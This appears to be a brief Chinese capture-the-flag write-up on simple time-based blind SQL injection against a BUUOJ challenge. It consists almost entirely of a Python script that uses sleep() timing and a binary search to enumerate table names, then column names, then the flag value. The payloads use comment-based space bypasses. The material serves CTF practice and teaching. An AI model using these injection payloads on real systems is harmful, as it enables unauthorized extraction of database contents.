# 知识点
简单的时间盲注
```python
import requests
import time
url = 'http://fc17123f-828b-4f45-bb46-d6ee6b06d325.node4.buuoj.cn:81/'
str = ''
for i in range(1, 60):
    min,max = 32, 128
    while True:
        j = (min + max) >> 1
        if(min == j):
            str += chr(j)
            print(str)
            break
        # 爆表名
        # payload = {
        #     "stunum": f"1/**/and/**/if(ascii(substr((Select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()),{i},1))<{j},sleep(0.8),1)%23"
        # }
        # 表名 flag,score

        # 爆列
        # payload = {
        #     "stunum": f"1/**/and/**/if(ascii(substr((Select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name='flag'),{i},1))<{j},sleep(0.8),1)%23"
        # }
        # 列名 flag,value

        # 爆值
        payload = {
            "stunum": f"1/**/and/**/if(ascii(substr((select/**/group_concat(`flag`, '~', `value`)/**/from/**/flag),{i},1))<{j},sleep(1),1)%23"

        }
        start_time = time.time()
        r = requests.get(url=url, params=payload).text
        end_time = time.time()
        sub = end_time - start_time
        if sub >= 1:
            max = j
        else:
            min = j

```
